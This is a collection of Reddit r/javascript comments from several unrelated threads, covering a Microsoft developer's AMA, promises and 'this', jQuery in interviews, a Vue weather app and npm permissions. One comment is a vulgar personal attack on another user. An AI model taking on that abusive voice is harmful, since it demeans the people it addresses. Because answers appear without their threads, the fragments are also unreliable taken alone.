The bug was acknowledged, but has still yet to be fixed.
Off the top of my head: - recursion - async - testing - performance
Hello Benjamin (Ben?)! I'm a native Oregonian, who moved to Taiwan and taught himself Chinese in three years, after graduating from college. This whole time I've been teaching English to fund my language learning journey, and now I want to transition into software development. I've spent the last nine months learning HTML, CSS, Javascript, and now React. Over the course of your career at Microsoft, have you met many people who transitioned in software successfully with only experience in other areas? If so, what set them apart, allowing them to do so?
it’s just finding that weekend
The audio stops after playing through, but it listens for onend/ended, and at onend/ended it runs the getNewAudioFileFunction which fetches another audio file from database API and plays that immediately after - and so it goes, on and on. In Safari this works flawlessly, but Chrome won't have it - and I have NO idea why?!? 
var hasn’t been deprecated
ah. Audio is a variable I set, to the file fetched most recently from the API.
&gt; Kevinkid You're working on a lot -- keep it up! I like that you throw everything up there, even things you are just messing around with. Shows that you are curious. My only recommendation would be to add more detail to your README files to each project, so that recruiters and developers have a better understanding of what you are doing with each project. 
That's grossly oversimplified and will get you in trouble sooner or later. 
Works for me in Chrome too. https://jsfiddle.net/vtdLqhzL/ There's probably something else interfering with your setup somehow.
Don’t you mean JScript?
Hmm. The examples are not dangerous. Be careful unnesting promises https://medium.com/@pyrolistical/the-hard-error-handling-case-made-easy-with-async-await-597fd4b908b1?source=linkShare-6849951de65c-1519261345
&gt; Only use Redux if your state becomes too hard to manage with just the standard framework you are using. Most applications are not complicated enough to warrant using redux. What do you consider most applications? If we are talking about some hobby work, then sure, you can avoid it. In most real world cases for consumer apps, redux is pretty important. Have you used redux before?
Hyperapp is more simple
The top 10 questions list is a little n00bish and out of date. How do i update HTML, for example, is irrelevant when using frameworks like React, Vue, or Angular. Have you considered updating your list for the modern virtual dom/Babel age?
&gt;you're FTFY What's the best way a beginner can practice JS?
Not *needing* it and it not making your life easier are two different things. I wouldn’t want to endlessly pass props down, or directly use the context API, just because I can get away with it.
Hi /u/RoundNeedleworker, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
We have the easy job, so anytime you're ready, go ahead and make an announcement post and shoot us a message so we can sticky it! Note to others considering doing an AMA: we don't have any firm rules/guidelines/etc. for AMA's, though it's probably safe to say that we would like them to be [in the spirit](https://www.reddit.com/r/IAmA/wiki/index#wiki_3._what_topics_are_and_are_not_allowed.3F) of /r/iama -- must be or have done something notable, have a unique perspective, etc. Please send a modmail with any questions!
Damn, Just started learning prmises and then bam I saw this lol. Really helped a lot. ok, thanks to the article I learned that .then creates a new promise. How would I make this code work ? l let promis1 = new Promise( (res, rej) =&gt; { // return res(successCallback); --&gt; This is WRONG setTimeout(() =&gt; { console.log(`Finally got called`); return res(successCallback()); }, 5000); // return ; } ); let promise2 = new Promise( (res,rej) =&gt; { console.log(`This is getting called for some reason`) return res(failureCallback()); } ); promis1.then(promise2);
I do this too. I don't think I've ever read about it specifically. I'm not sure it is "a thing", but would be happy to be proved wrong!
I'm actually quite surprised you didn't say Closures. 
I'd gild you if I could...
Thanks for the answers everyone
&gt; sources https://code.facebook.com/posts/1716776591680069/react-16-a-look-inside-an-api-compatible-rewrite-of-our-frontend-ui-library/
At least I woke up. No one on reddit ever has.
[Do you know what you're talking about?](https://en.wikipedia.org/wiki/JScript)
Isn't there a difference in closure between arrow functions and function () {}?
I hear there's one coming up!
Are you a self tought developer or did you go through uni or both? And do you think uni plays a big role to becoming a software developer? 
And DOM manipulation is not the sum total of what JavaScript can do. If you’re excluding candidates because they mention jQuery, then you’re not evaluating them on the vast majority of the languages’ characteristics. What about closures, hoisting, prototypical inheritance, using this, functional programming characteristics, functional scope, es6/7 features, etc. etc. I suspect many candidates still reference jQuery mainly because the syntax is easier to remember. Instead of document,createElement, you just use $(). In that case I would query (no pun intended) why s/he chose it and what would be the drawbacks (and yes, advantages) to using such a framework. Would I pick jQuery for a new project? No. On any nontrivial application a framework is going to be used because it’s going to be more efficient and probably easier to understand than whatever homegrown thing a snobby developer cane up with.
Doesn't mean you should keep using it.
I agree. Can you come up with a good ELI5 analogy?
Thanks #gatsby, my blog build completed, and I look forward to the good news that the problem when add pathPrefix resolved. [fengshangwuqi's blog](https://fengshangwuqi.github.io/fswq-blog/ )
&gt; If any of your answers to these include the word "jQuery," then thanks for your time, we'll be in touch. Why don't you chop off your dick and park it inside your butthole? 
As usual amaop ignores the most important questions
What is your dev and deployment environment? Do you develop/test on a local windows machine and then deploy to a linux server?
Great responses Benjamin! Thank you for sharing your 10 JS questions. Definitely a great resource some of the top questions that pop up when learning JS!
Here's another thought. Instead of asking questions that Javascript developers rarely do in production anymore, why not have them build a Modal JS class that's reusable. Give them an arbitrary amount of time (20 minutes, 30 minutes, whatever) and allow them to use whatever resources they want. Then grill them on their approach. Did it turn out to be something you can plop in an application with little fuss or does it need extensive rework to make it modular? Did they choose a framework? Why this one over something else? Is it extensible? Can I use inheritance to create a StandardModal, a ResponsiveModal, etc. etc. Did they take an OOP approach -- if so, did they use methods and constructors properly? Then ask them how they would improve this if it had to go out on production, and here's where you look for writing unit tests, cross-browser compatibility issues, extensibility, etc. etc. I would think this would tell you much more information about a candidate's approach to writing software. 
A lot of times it's a choice between learning to make a basic wheel, or learning how an entire steam locomotive works. A steam powered steel wheel is awesome and powerful - but what if it spins at the wrong rate, or you need to add manual steering off a rail? At that point would probably have been easier to make a simple wooden wheel. Plus, the wheel knowledge you gain is valuable for ALL wheels, not just steam locomotives - so even if you move to a framework/library later, at least you'll know the real difference between a truck tire and wooden spoked wheel + the advantages of each
buwhahah you reference something that existed from 1996 to 2011. Last existed in IE9 Way to hold a grudge. I thought you were referring to typescript.
If you are starting to learn Javascript, you may a well only [learn the good parts](http://shop.oreilly.com/product/9780596517748.do)
I don't think the confusion necessarily stems from the concept of 'this', but more how in JS 'this' can be all over the place. Scope is funky. Using an arrow function leads to a different scope, functions as parameters is screwy, jQuery is just...jQuery. I can't keep it all straight, personally. So I just avoid using this. as much as possible.
Yeah the official dos is cool and gave me the first look of event loop. However, the official doc doesn't share you all the details (atleast I couldn't get). Like, 1. The doc says, poll executes timer scripts. Poll controls timer expiration. It gives a feeling that poll is calculating timer elapses. However poll wants only the first timer script to calculate how much max he can wait for new requests. 2. It says if you trigger setTimeout and setImmediate from a non-io phase, the execution depends on the performance of the machine. But how the hack system performance comes here is shown in voidcanvas. 3. Docs doesn't say when the loop is created add when and where the codes in side your main module will run. So there are things like these in the voidcanvas article to bring up a more clearer picture. 
JQuery is the devil! Please don’t spread this nonsense!
This is entirely true. I've never worked with a recruiter, but the large majority I've talked to are quite in touch. A lot even come from a programming/engineering background. Just find the right person!
That's what I thought, thanks for confirming. Just wanted to make sure I wasn't crazy, and that it got mentioned so others didn't get confused at unexpected behavior.
&gt; Using an arrow function leads to a different scope No it doesn't. Arrow functions retain their parent scope. Using a function necessarily switches your scope up, unless you `bind` it.
What city are you in? 
Your image is a file - so, use multipart/form-data when your form includes any &lt;input type="file"&gt;
```const formatDate = date =&gt; `${ ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'August', 'September', 'October', 'November', 'December'][date.getMonth()] } ${ date.getDate() } at ${date.getHours()}:${date.getSeconds()}`; console.log(formatDate(new Date("2018-02-21T13:53:31.333Z")));``` Are you happy? No vars now!
Arrow functions have 'this' lexically scoped , declared functions based on where they're called. That's different. And it doesn't even cover strict mode, objects, constructors, working with the DOM, bind/call/apply... And by functions as parameters, I was speaking - again - to 'this' scoping. But while we're at it...in the middle of a conversation about explanation of 'this' to beginners you want to drop a bunch of opinionated high-level knowledge? Hmm... And I brought up jQuery because a lot of beginner JS programmers have experience with it. How it handles 'this' might confuse them. I - fortunately - work in node and not the browser :)
What exactly are you trying to accomplish? What have you tried yourself?
I am wanting to remove any tracking/redirects used by websites on links that are shown in them. I have tried some other userscripts (one that just kept reloading pages when it included all pages, but one did work as well as the one I linked to except it had the cleaned url in a popup).
:(
Promises automatically start the moment they're created. In your example, `promise2` immediately activates which immediately executes function `y`, and the promise is now completed. If you want to wrap `y` into a promise, you create a function that returns a promise instead, which means it is not executed until the function is called. *Side note: This also means your first promise, `promis1` has already started executing before you are using it in your code, but that's not a big problem in this example.* --- --- In your code, add/change to have this: // Remove promise2 // Add this function promiseY(){ return new Promise(res =&gt; res(y())) } // Replace your last line with this promis1.then(promiseY)
Well, for Google at least it should be pretty easy - iterate through every link and invalidate the click handler somehow, you shouldn't be having trouble with something like that (also, that userscript seems to mix var and const??)
1. I don't know how to modify the userscript so it does that. 2. Is that a bad thing?
I found [The Odin Project](https://theodinproject.com) to be a great resource when I was starting out, and I'm sure it's been updated a lot more by now.
 function x() { console.log("bla"); } function y() { console.log("not bla"); } let promise1 = new Promise( (res, rej) =&gt; { setTimeout(function () { res(x()); }); }); let promise2 = () =&gt; { return new Promise( (res,rej) =&gt; { return res(y()); }) }; promise1.then(promise2); 
Maybe they’ve some internal tools at microsoft 🧐
that is kind of scary to hear someone teaching JavaScript say
As promised (pun intended) I went through your answer. &gt; My first take was actually horribly broken. The same stands for me... There's a kind of fun story about how I started with this polyfill, but that's not the point. Even if your first attempt was wrong, I bet that you've learnt much more writing the wrong solution. Sure nobody has the time to do all the possible errors; learning from someone else's errors (or success) is far way cheaper. So I agree on the fact that having an understanding of the problem space is important before starting to write code, but it's not always possible, or realistic to expect a 100% coverage of the problem space... it's likely (at least in my experience) that along the way you'll learn lots of new stuff. In my case I learnt a lot from Jake Archibald's posts on the subject, such as Tasks, microtasks, queues and schedules, https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/, I've used different others promise polyfills back in time when built-in was not yet available, and sure all of them have taught, or influenced me. &gt; (e.g. the semantics of .then if it's a getter that does side-effects -- yes, that's a thing). I'm not sure what you mean here? Could you please explain it to me? BTW today (10.00 AM CET) I've scheduled the publication of the second video, in which we're going to write `Promise#then`. This is the link https://youtu.be/inzlNB_JvVE, depending on the time you'll click it may/not be available. &gt; You mentioned you're writing a promise polyfill. Here's mine Well, I haven't realised you're the creator of mithril. Despite we've chosen different approach, I can see lots of similitudes with the code I've written myself, especially on the static methods... Other things are different; I guess we had different constraints; for instance I used MutationObserver as mechanism to schedule microtasks, since I wanted my polyfill to be as spec compliant as possible; or perhaps is there any particular reason for which in your implementation `Promise.all`, `Promise.race` does not work with any kind of iterable? This was something I've learnt along the way, and immediately stands out when I watched your implementation. Anyway, I've really appreciated your feedback! I hope to read your thoughts also on the other videos.
00 AM CET happens when this comment is 16 hours and 32 minutes old. You can find the live countdown here: https://countle.com/i-R143457z --- I'm a bot, if you want to send feedback, please comment below or send a PM.
https://github.com/h5bp/Front-end-Developer-Interview-Questions/blob/master/README.md some of these questions are a bit nonsense though. I found it quite usefully when interviewing any level developer to the point where I accidentally memorized them all :p though most of these questions are quite simple for seniors. but then I'd rather ask them more questions about the current state and future of JavaScript and frameworks. if they mention jQuery then it is thank you for coming we will be in touch
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [h5bp/Front-end-Developer-Interview-Questions/.../**README.md** (master → e4c5740)](https://github.com/h5bp/Front-end-Developer-Interview-Questions/blob/e4c574004d764324393f76858a12c74c8fe548df/README.md) ---- [^delete](https://www.reddit.com/message/compose/?to=GitHubPermalinkBot&amp;subject=deletion&amp;message=Delete reply dun2og3.)
https://i.imgur.com/fFXj5jQ.jpg We’re all vars down here
wow, that's interesting. Is this for promises only ? Or this is how JS works in general ?
&gt; /u/DukeBerith already gave you a very simple explanation. I'm just converting his words into code, but thanks to him :) &gt; &gt; thank you so much :-D
Nah, you have to actually upload it into the stylesheet page.
check out [querySelectorAll()](https://developer.mozilla.org/en-US/docs/Web/API/Document/querySelectorAll)
Lots of teams in Microsoft use TypeScript. I started on the OneDrive web team and am now on the OWA team - who both use TypeScript and React. You should check out Office UI Fabric React on GitHub to see the common controls different Microsoft web properties use. Feel free to help us improve them! It wouldn't look bad on a resume. 🤙🏻
great thnx bro, querySelectorAll() returned an array of size 3 with all three elements.
How is this different than picodom
I am going to try this with a React project I am trying to build, anything I need to worry of?
I think the above explanation is so simple that it's wrong half the time. If you really make this your "what is `this`" mental bridge you'll write a lot of broken code and you won't understand why. ELI5 are supposed to explain something in a simple way. They can maybe be incomplete but they shouldn't be wrong. 'the object to the left of the dot operator' is just the object that has a property that holds your function. const Bananas = { count: 10 }; const Apples = { count: 5 }; Apples.bar = function () { console.log(this); }.bind(Bananas); Apples.foo = () =&gt; console.log(this); const bar = Apples.bar; Apples.foo() // Apples is 'the thing to the left of the dot' and therefore 'this' // Well, no. The `this` inside `Apples.foo` is the global object (the `window` in browsers). bar() //window is 'the thing to the left of the dot' // Well, no. The `this` inside `bar` is `Bananas`. `this` is the execution context of your function and it points to what ever value is bound to it, either manually or automatically. And it can change depending on how you call your function. That may bot be good enough for a 5 year-old though.
Why on earth would anybody want to migrate an existing C#/Java backend to Javascript?
Not that I'm aware of. Feel free to reach out if you need any specific help with incorporating easypz.js if the docs aren't sufficient.
Maybe /u/HeyGuysImMichael works for Google
Nice arguments, bro
Maybe because a company's focus is evolving to be more and more web oriented. It might make sense to have different developer profiles be more experienced in JS.
Thanks for the explanation. I didn't know that... my current implementation is wrong in that regard; I'm triggering the getter twice: once for `typeof obj.then == "function"`, and a second time to execute it. It shouldn't be too hard to use the same approach you're using in your lib. I'm going to fix this, and add the fix in the video series. Thank you!
Am all in BBQLays. Doing a clone right now.
Thanks! Could it be that I'm using audio as a var also? var audio = new Audio(birdFile); //audio.play(audio); audio.addEventListener('loadedmetadata', function() { console.log(audio.duration); audio.play(audio) }); activeAudio = audio; audio.onended = function() { console.log('Audio Ended'); getNewAudioFileFunction(); }
https://jsfiddle.net/egudxbk5/34/ This uses mocha from a cdn. If youre just looking to play around then I think its enough. Later on when you have it installed on your pc you wont need any of the "mocha." code. You will run "mocha ./yourTestFodler" and it will do everything for you. All you need is the "describe("...")" part
JavaScript: The good parts
iow, I'm right, and yes they did create their own version of javascript? And you're reaction is cause you assumed something I never said?
jQuery is not standard... including jQuery for simple dom manipulation is a bad idea
Just to clarify, it doesn't actually return an array, but a [NodeList](https://developer.mozilla.org/en-US/docs/Web/API/NodeList). The two are very similar, and you might not see a difference, however a NodeList doesn't have all the same methods available to it that an Array does. Fortunately, it's very easy to convert into a regular array, should you need to.
I haven't tried it but Vuex should also work without Vue.
Yup, looks like you got it down! :)
How do you get good at writing JavaScript code? For me I understand the basic syntax and fundamentals of programming(functions, loops etc) but when it comes to Js Idk what to build and how to build up my skills. With Python I can just have an idea for a game and just code it out. But I want to spend a year on JavaScript bc that’s where the money is. 
Yes, it is excellent luck and a boon to your value while you are getting paid to do it! Seems like a good deal to me.
One is design and the other is coding the front end. Yes some jobs combine these two skills because they overlap and some ppl professionally can do both. 
Looks great! Nice work!
Web workers offer a separate thread where you can do number crunching or remote calls, but you cannot access the Dom. Service workers are used to get an offline experience via caching outgoing network calls. I think if you want to learn more about this style, you should search for tutorials on progressive web apps. I see in your link that an angularjs app is laggy while a Qt app is not. This, I believe, is a common gripe with angularjs. I'm more experienced with React, which has a reputation of being much faster, so I cannot really say much more.
Please may you explain it like to a 5 year old or in the most simple terms. Thank you.
[Permanent](https://help.github.com/articles/getting-permanent-links-to-files/#press-y-to-permalink-to-a-file-in-a-specific-commit) GitHub links: * [getify/You-Dont-Know-JS/.../**ch5.md#inspecting-class-relationships** (master → 6f51ed6)](https://github.com/getify/You-Dont-Know-JS/blob/6f51ed6746300f51bc6c930c080b8a7426b7629b/this%20%26%20object%20prototypes/ch5.md#inspecting-class-relationships) ---- 
Thanks man!
Just want to say it's from Oct 2016
Pub static void main(args) public: it's a function that is callable outside of it's class static: there's more to it, but basically it's a function callable without first creating an instance of the class it belongs to void: it doesn't return a value main: the function name. In this case it's the main/entry point of the app String args[]: parameters being passed in
In JavaScript it means absolutely nothing
That's Java, not Javascript
Or maybe just b64 encode this file
Looks like fun and will contribute =] round = (n, decimals) =&gt; Math.round(n * 10 ** decimals) / 10 ** decimals merge = (...arrs) =&gt; arrs.reduce((acc, arr) =&gt; acc.concat(arr), []) sum = arr =&gt; arr.reduce((acc, n) =&gt; acc + n, 0) objForEach = (obj, callback) =&gt; Object.keys(obj).forEach((key, i) =&gt; callback(obj[key], key))
It became a "standard" in ES6 but under _"Additional ECMAScript Features for Web Browsers"_ which means it's not expected to work everywhere (though it still mostly does, such as in node). If you want to get technical, its the `[[Prototype]]` internal slot that the engine looks at, and `__proto__` is just an instance property for referencing that. But `getPrototypeOf` is a better approach for getting this object, and far less ugly. Double underscores = blech!
I assumed you would bring up something that's actually relevant
dollar-js is a good alternative 
Thanks for sharing the code. Looks great and I like the details like day night mode! 
Hi /u/Quicksteam9, please refrain from personal attacks. Thanks.
Hi /u/zoesherm, For javascript help, please visit /r/LearnJavascript. Thank you!
I personally think university shouldn't play such a big role in becoming a software developer, guys like Bill and Elon would probably agree but am curious to know whats going on with edx. Does it mean years to come someone doesn't have to go through school to become a decent software developer?
Manual zip code input will be a nice to have for those who have location blocked.
https://i.imgur.com/zbf4QmM.gif
I'm surprised the MS guy didn't tell you to learn Typescript. You should check it out. 
Yeah, I gotta say, I was surprised when `npm update -g npm` installed 5.7.0, but `npm i -g npm` installed 5.6.0. If this is intended behavior, it's definitely not intuitive. [Screenshot.](https://user-images.githubusercontent.com/2061559/36542646-621a4b5a-17af-11e8-82d3-856a6b04af91.png)
Seems not possible. [link](https://github.com/vuejs/vuex/issues/550)
&gt; The ‘__proto__’ property of an object is what the object inherits its properties from Is this technically correct? From my understanding, the prototype is how the object delegates its properties, rather than inheriting them
Thanks Benjamin, and others helping with answers. To clarify for others: My problem is I'm surrounded by a bunch of backend devs doing front end work. Bad company execution aside, this group of people is hard to convince and they write their FE code like Java classes. Try selling them a different approach, then it turns to 5:1 fight me vs a team of Java devs with Comp Si &amp; textbook things thrown at me (I have no degree, did everything on my own since dot com bubble). I've volunteered my time to help &amp; train these people, but some devs are just hard to convince to think differently and always puts up a fight. "Do you have a degree?" was one of the first question I received when I start my trainings. It's acceptable to write FE things with OOP patterns, but we're definitely not utilizing JavaScript at its fullest potential. Anyways, this is probably more of a people issue than a tech issue. But I just want to ask &amp; see if anyone had similar experiences and could share some tips from the technical side of things.
The night time looks incredibly well. My only gripe is that day time could use a little bit more contrast between background and text. Other than that - great project, nice work!
Is there a good reason to run npm with sudo?
Ah, interesting. But I wonder if this just affects a few features. Because in theory you just create a pure Vuex instance. You can use that instance to access actions, mutations and the state. But maybe getters are a problem?
&gt; Plus, the wheel knowledge you gain is valuable for ALL wheels Yes, that’s something I completely agree
Thanks man!
Came here to make this comment as well. I made a similar angular app years ago like this. Where are you sourcing your weather svgs? I see them in your assets folder. I used http://www.alessioatzeni.com/meteocons/ which look very similar (they also have night versions as well). I like the artwork and monochromatic feel you have.
I have one more question. While working on exercises. I often come up with my own solutions that are very different from the ones that FreeCodeCamp provides. But the problem is even tho my solutions work, they are longer and i feel im complicating to much for even the simplest tasks. Should I try to make my solutions more optimal or is it good as long as it works?
[Maybe not](https://pawelgrzybek.com/fix-priviliges-and-never-again-use-sudo-with-npm/)
Within a promise chain, return values are always wrapped inside a promise `somePromise.then(x =&gt; Promise.resolve(syncFunction(x)))` is equivalent to `somePromise.then(x =&gt; syncFunction(x))`, which can be represented more simply as `somePromise.then(syncFunction)`. For your case, this is sufficient: `promise1.then(y)`
Very nice work. I am a vue fan and I am all for pwa. One thing to note: I viewed the page on my phone (on wifi) and had gps off and it asked me to go online instead of turning on my GPS. 
You're confusing node and npm.
You're totally right. Which is weird, because I read through the entire thread for that issue. Hmmm... haven't had my coffee yet. lol
You're totally right. Which is weird, because I read through the entire thread for that issue. Hmmm... haven't had my coffee yet. lol
Please correct me if I am wrong. I think PWAs are useless, all it does is show me stale data until I have a working connection from a user point of view. The concept of offline is more appropriate for games. 
Okay. So I was clarifying that because of the way you asked your question. UX/UI is a lot more than design. It’s all about user experience and a true UX/UI professional will use A/B testing, analytics, focus groups, one on one surveys, heatmaps and will know a lot about design but isn’t necessarily the designer. A front end dev will make some of the decisions as above but will often be a js coder and build the front facing website or app. A company looking for UX/UI désigner is looking for a specialist in that area normally. A Front End Developer can mean so many things to different companies. If you have a few projects in your portfolio with one of the frameworks like Vue or angular, you don’t have a great chance with limited long term experience but probably a better chance than with just UX/UI. You will want to specialize and get expert in something you enjoy doing and then generalize from there, meaning get really good at Vue let’s say and then go back and get really expert at plain ole Vanilla js and then expert in the DOM. As an example. From there any company would know that Angular, React or Vue would be easy to learn for you. And not complain because most of your experience is Vue, as an example. Good luck. -dk Contrary to what the guy above said, there is a great shortage of skilled programmers and many companies will take a chance on someone who can show that they can learn and apply to projects. So start commuting to GitHub, get a portfolio up, make some shit and show your passion for programming and many times this will be your most valuable asset to a company.
kk, thnx. I just need them in 3 different variables.
Thanks! I just don't prefer method chaining so I'm using the ECMAScript2017's async/await feature. For me it is way more cleaner than method chaining.
That would be a nice next feature to have, thanks for the feedback!
I solved it. It turns out bootstrap.min.js was loading twice, thus executing the command twice, opening and closing again.
Dont change the bin and share premissions.... Just dont....
Eh. You can cache forecasted data for a few days out, and use it when fresh data is not available? But you should indicate as much.
I'm not convinced this is the right solution either. The problem might be we let npm handle too many parts of the installation and our laziness led us to accept it does some post-install steps we really should do separately (like adding links in usr/local/bin).
This article has made me wonder: What happens if I were to store illegal data in the Ethereum blockchain? (Leaked docs of an unjust government in the best case, child pornography in the worst case)
Npm it on the support and it caused a lot of problems on systems and ppl had to do the os again so now i think they removed it cause i cant find it the is still up and the guy doesnt give a damn about it....
Main is the name of the function, in this case it’s most likely the function that will run on startup. It is modified by public, meaning it can be accessed from anywhere and static, meaning it is a function that can be ran without an instance. string[] is a type declaration for the variable args, which is short for arguments. This function is most seen in command line programs.
Thanks man! Nice catch!
Looks great! Do you have any resources/guides that you recommend for someone to build their first PWA?
Thanks, that is useful for me :-) I will give it a try, fortunately i have something already working and not very far from the final result, so i can test to see if with some optimizations i obtain something better. If not, i'm happy to at least having had the chance to get started with web development. 
youtube video pages
It doesn't do vdom diffing, only DOM creation, and it's a tenth of the size
"Inheritance" is an abstract concept that means "the mechanism by which more specific elements incorporate structure and behavior defined by more general elements," without specifying how that mechanism works. "Delegation" is a specific implementation to achieve the abstract concept of inheritance. For example, in both Python and Ruby, inheritance from instance to class to superclass is done by delegation, just like in JavaScript.
Or for articles that you loaded once, and want to read later.
I would say no. jQuery is mostly just unnecessary bloat now-a-days. While it is good to have some experience with jQuery for being able to maintain legacy apps, there is almost no reason to use it anymore other than it being a dependency for a lot of things. Learning vanilla JS really well is your best option IMO. If you know vanilla really well, it doesn't matter what library / framework you want to / are required to work with in the future, you will be able to pick them up and learn them with ease as you already know how they work behind the scenes anyways.
Pretty cool! Small suggestion would be to rip out your constants (API URI, app ID, the snow/rain IDs etc.) so there's a central place to change them, should they need to be changed. Also (this is pedantic), do you need to include the dist/ folder in the source? I've never used Vue, but if it's just gonna be generated as a bundle like webpack does, then no need to include it
For example the getForecast method. You fetch().then() rather than await fetch() They were asking why you chose to use the promise (then) and not await there
Not at all. Don't go that way. You see plenty of tutorials that go this (really bad) path: * Download x and y jQuery plugins * Mess around with their array parameters * That's it, you're a JS pro because you have a modal window fading in and out of your screen! jQuery isn't Javascript. It's a Javascript _library_. This means it helps you out with some JS stuff but it will not replace knowing how to write JS. You might get away with it for simple stuff, but that lack of knowledge will _definitely_ emerge when you least expect. Some good resources for begginers / intermediate devs: * https://watchandcode.com/ * http://www.freecodecamp.com/ * Also worth checking out the most voted courses on Udemy (usually at 90% discount too) Once you start getting serious, give http://eloquentjavascript.net a shot. It's pretty advanced but goes through a lot of important aspects of the language. One more thing. jQuery is a mess and I wouldn't recommend it to anyone developing professionally in 2018. I doesn't make any sense to use jQuery nowadays when you have React, Angular and Vue. The only possible reason to do so is if you're stuck working with legacy stuff that depends on very specific packages you can't find alternatives for. 
can you write in the readme how to run it locally? Sorry, node noob. Also, how do you package and deploy something like this?
It's necessary for projects that interface with hardware. For example, I have a few Raspberry Pis that use [this](https://www.npmjs.com/package/rpi-ws2801) lib.
A weather app is indeed a rather poor case study for a PWA, but even if you're offline, it can still show you: - Cached forecast data - for a lot of forecasts, you really don't care about whether the data is a couple hours old or not - The temperature from the last time you checked it (not so useful, but still) Regardless, showing stale data is always better than not showing anything at all. It's a problem if it shows stale data without pointing out that it's stale, but this would be a UX issue, not a failing of the concept of PWAs.
PWAs are excellent solution to certain problems that it fits. But I guess your problem is just about the implementation detail.
This is a small project I put in an afternoon to demonstrate the concept of rAF+Promise. Remember, it's not about doing the same app with least amount of script, it just demonstrates the idea of recursive imports being throttled and offloaded to Promises if possible without touching a single bundler. Total size of the library is 6kB. ie9+ supported. 
I can offer you a remote intership building a react-native app with a serverless backend. You will gain Amazon Web Services experience and Javascript as well. Lmk if interested
Ad for a paid course.
&gt; For example, you can have a user start downloading a PDF while Node is still generating it That's very theoretical. I think Node Streams are basically dismissed (very underused). I'd be interested to see an example of "JIT download", because it's a pretty cool concept and reduces user wait time.
We'll fairly responsive here, so within a few hours of letting us know of an announcement post, we can sticky it. It's up to you how far in advance you want to announce -- /u/MicrosoftLearning gave ~24 hours notice, which is probably on the short end (but worked out fine); on the maximum end, a week or so? 
You described a situation where there is no convincing possible. The closest to an answer would be a course on company politics and a course on body language and assertiveness, which is besides the subject. Best case scenario is make them use Angular 2, which is similar to the Java OOP approach. It will have them follow some type of standard (If you're doing custom JS library, may the gods be with you) and you can always go back to "This was made by engineers with degrees at Google, you don't have to take my word". I feel more comfortable with React, but Angular 2 is better than spaghetti. https://yakovfain.com/2016/01/03/why-java-developers-will-embrace-angular-2-and-typescript/
I think it is better off asking questions around ECMAScripts, instead of javascript. I don't think it is important at all to remember how DOM manipulation is done. Google is always your friend when it comes to this. But the core ECMAScript concepts should be something that an experienced Javascript-er knows.
No, apart from consistency generally makes things clearer and therefore easier to maintian.
This is nice so far. For those of you that enjoy solving challenges online, here are a few nice sites with interactive editors and challenges. [The 10 Best Coding Challenge Websites for 2018](https://medium.com/coderbyte/the-10-best-coding-challenge-websites-for-2018-12b57645b654)
True, i usually use await async for now; but once in a while you get those functions that only return callbacks so you have to "adapt it" 
Nice I like the minimalist design. Though you should probably hide your app-id in the repo.
yes.. I guess it is still relevant these times, at least a part of it. :)
Maybe I'm missing what you're actually asking, but.. const obj = { text: 'here is some text', seomthing: { text: 'here is seomthing some text' } }; obj['text']; // here is some text obj['seomthing']['text']; // here is seomthing some text
Thanks for the suggestion, I was also puzzled on how to go about this. I was trying to use `.env` to store and hide my APP_ID but found out `process.env` is only visible in node and not in browser. &gt; do you need to include the dist/ folder in the source? I needed the `dist/` to be hosted in gh-pages through git subtree. 
No there's very little reason to do so. Global installs are just asking for problems anyway.
That sounds interesting! Can you tell me more about it?
awesome, clean, amazing work. I also am playing around with Vue, it's so easy compared to angular or react this is what I created so far http://shapefor.me 
You could use bluebird to promisify, I know node has its own promisify function now but I’m not sure about vanilla js. I don’t think it’s a feature of vanilla js but I could be wrong. You can promisify any “thenable” function
Yeah I've read about bluebird and seen the performance and functional advantages it has over es6 promises, just that I don't want to re-do all of my code, and don't want to get into a habit of just accumulating packages; though it would probably be worth it for promises. 
[looks at calendar]
Look into the webpack define plugin. It injects environment variables into your App context on build time. https://github.com/gdi2290/angular-starter/issues/386 as an example 
Obviously all in ES6+ a few that springs to mind - a workflow for setting up a modern, ES6 project (vanilla, react, whatever). It doesn't matter how you do it - create-react-app or your own boilerplate or you actually can do it all manually (crazy), but you should look like you have done it before and are relatively confident doing it - make sure at least one module has tests, doesn't matter wich library (jest is the fastest to set up, but use whatever) - fetching some data (prefereably with images) from an api and showing it in a grid of some sort with a "more" button - Async / promises (both) - WebSocket - service workers - profiling using a browser's inspector of your choice - some animation based UI piece, typicially an accordion or an image gallery 
Apropos jQuery: I am in the middle of changing jobs and have interviewed for a while (I am expensive :-P, hence why the 'for a while') and I can tell NOBODY wants devs who use jQuery (unless on a legacy project, of course), and many asked me leading questions along the lines of "Obviously you don't use jQuery anymore, right? RIGHT??" Right or wrong, that's where the industry is moving to
I think it would error out if I `await fetch()` because of the asynchronous nature of `fetch()` thus passing invalid data to `this.populate(data)`.
After downloading the page, it says I'm not connected to the internet. 
One thing you don't want to have is another bloat by adding more and more libraries to your code specially if it's a PWA
Bloat is such an issue with npm/node/js so I definitely feel you there. I think if you only have one or two methods that require a callback, just do the callback. Promisifying really comes in handy when you have to use a lot of callbacks
Object[something][text] if using variables to dynamically access properties. If you know the property names then you can also use dot notation: object.something.text or a combination of the two: object.something[text]
Thanks man! definitely gonna lvl up my webpack-fu this time :)
I have both mobile data and location on but rejected to send location when prompted then the app asks to internet on.
No because your using the fetch promise to return to promise from .json() which is an async call If you wanted to write it with async await, you’d Data = await fetch(); Return data.json(); Then your await above would await on the json promise. Just like your current code You’d have to wrap it in a try/catch to get the error handling, though at this point if the fetch failed you’d pass back an error to the await and it would break. 
you can also get some dates (creation, modified, accessed) with fs.statSync as fallback 
[5.7.1 is now released](https://github.com/npm/npm/pull/19889) specifically to address this issue... but the code changes have no accompanying tests, no regression tests and a failed CI job check. Is this a joke?
It depends on what you want to specialize in. Basically it is a "niche" inside the whole of frontend development. But it is surely one of the more famous frameworks. If you are interested in datavisualization, then I strongly recommend to look into it. But best is to keep a strong focus on JS programming without any framework, get the basics and programming patters to build a strong foundation. Then learning any new framework will be a breeze.
“Please connect to internet to fetch latest forecast :)” :(
That’s not the way to solve that problem. There are multiple, better ways to do this. Here are the three most common: In order of descending complexity: async/await, promises and callback functions. In order of descending readability: async/await, promises and callback functions.
Hi /u/madsenfc, For javascript help, please visit /r/LearnJavascript. Thank you!
